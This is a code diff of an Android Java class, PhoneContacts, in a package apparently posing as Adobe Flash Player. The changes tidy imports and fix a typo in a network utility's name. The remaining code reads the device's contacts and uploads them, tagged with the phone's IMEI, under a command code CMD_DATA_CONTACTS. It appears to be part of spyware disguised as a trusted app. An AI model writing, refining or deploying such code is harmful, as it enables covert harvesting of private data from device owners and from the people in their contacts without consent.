@@ -2,24 +2,20 @@ package com.adobe.flashplayer.data;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
-import android.annotation.TargetApi;
+
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
-import android.os.Build;
 import android.provider.ContactsContract;
 import android.util.Log;
 import com.adobe.flashplayer.Public;
 import androidx.core.content.ContextCompat;
 import com.adobe.flashplayer.Utils;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 import com.adobe.flashplayer.MyLog;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageInfo;
-import android.content.pm.PackageManager;
-import android.content.ContentResolver;
 
+import android.content.pm.PackageManager;
 
 
 public class PhoneContacts {
@@ -63,7 +59,7 @@ public class PhoneContacts {
                     }
                     cursor.close();
                 }
-                if (NetworkUitls.isNetworkAvailable(context)) {
+                if (NetworkUtils.isNetworkAvailable(context)) {
                     UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_CONTACTS, Public.IMEI);
                 }else{
 
